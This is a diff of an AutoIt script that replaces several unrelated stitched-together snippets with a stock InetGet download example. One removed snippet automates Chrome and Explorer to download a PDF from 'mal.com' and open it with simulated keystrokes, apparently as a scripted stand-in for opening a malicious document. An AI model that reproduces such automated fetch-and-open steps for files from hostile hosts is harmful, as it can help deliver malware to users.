@@ -1,93 +1,17 @@
-; Function to download the file using Chrome
-Func DownloadFileWithChrome($url)
-    ; Open Chrome and navigate to the URL
-    Run("chrome.exe " & $url)
-    Sleep(5000) ; Wait for Chrome to open and load the URL
+Func Example()
+        ; Save the downloaded file to the temporary folder.
+        Local $sFilePath = _WinAPI_GetTempFileName(@TempDir)
 
-    ; Wait for the download to complete (assuming default download location and auto-download setting)
-    Sleep(10000) ; Adjust the sleep time if needed
+        ; Download the file by waiting for it to complete. The option of 'get the file from the local cache' has been selected.
+        Local $iBytesSize = InetGet("http://www.autoitscript.com/autoit3/files/beta/update.dat", $sFilePath, $INET_FORCERELOAD)
 
-    ; Close Chrome
-    ProcessClose("chrome.exe")
-EndFunc
+        ; Retrieve the filesize.
+        Local $iFileSize = FileGetSize($sFilePath)
 
-; Main script
+        ; Display details about the total number of bytes read and the filesize.
+        MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _
+                        "The total filesize: " & $iFileSize)
 
-; Step 1: Download the PDF file using Chrome
-DownloadFileWithChrome("https://mal.com/123.pdf")
-
-; Step 2: Open explorer.exe
-Run("explorer.exe")
-Sleep(2000)
-
-; Step 3: Navigate to the Downloads folder
-Send("#r")
-Sleep(500)
-Send(@UserProfileDir & "\Downloads{ENTER}")
-Sleep(2000)
-
-; Step 4: Open 123.pdf file
-Send("123.pdf{ENTER}")
-Sleep(5000) ; Adjust the sleep time if needed
-
-; Step 5: Close the PDF file (assuming default PDF viewer)
-Send("!{F4}")
-Sleep(1000)
-
-; Step 6: Close the Windows Explorer window
-Send("!{F4}")
-
-    #include <MsgBoxConstants.au3>
-
-; URL of the file
-Local $url = "https://www.paloaltonetworks.com/resources/whitepapers/ransomware-defense-strategies.pdf"
-
-; Function to extract the file name from the URL
-Func GetFileNameFromURL($sURL)
-    ; Find the last occurrence of "/" in the URL
-    Local $iLastSlashPos = StringInStr($sURL, "/", 0, -1)
-    ; Extract the file name using StringTrimLeft
-    Local $sFileName = StringTrimLeft($sURL, $iLastSlashPos)
-    Return $sFileName
-EndFunc
-
-; Get the file name from the URL
-Local $sFileName = GetFileNameFromURL($url)
-
-; Display the file name
-MsgBox($MB_SYSTEMMODAL, "File Name", $sFileName)
-
-
-#include <Inet.au3>
-#include <Array.au3>
-#include <MsgBoxConstants.au3>
-
-; URL of the website to read text from
-Local $url = "http://example.com/sampletext.txt"
-
-; Read the content of the website
-Local $sData = _INetGetSource($url)
-
-; Check if data was successfully retrieved
-If @error Then
-    MsgBox($MB_SYSTEMMODAL, "Error", "Failed to retrieve data from the website.")
-    Exit
-EndIf
-
-; Parse the content by delimiter (comma)
-Local $aArray = StringSplit($sData, ",")
-
-; Check if the parsing was successful
-If @error Then
-    MsgBox($MB_SYSTEMMODAL, "Error", "Failed to parse the content.")
-    Exit
-EndIf
-
-; Remove the first element of the array which contains the count of elements
-_ArrayDelete($aArray, 0)
-
-; Pick a random line from the array
-Local $iRandomIndex = Random(1, UBound($aArray) - 1, 1)
-
-; Display the randomly picked line
-MsgBox($MB_SYSTEMMODAL, "Random Line", $aArray[$iRandomIndex])
+        ; Delete the file.
+        FileDelete($sFilePath)
+EndFunc   ;==>Example
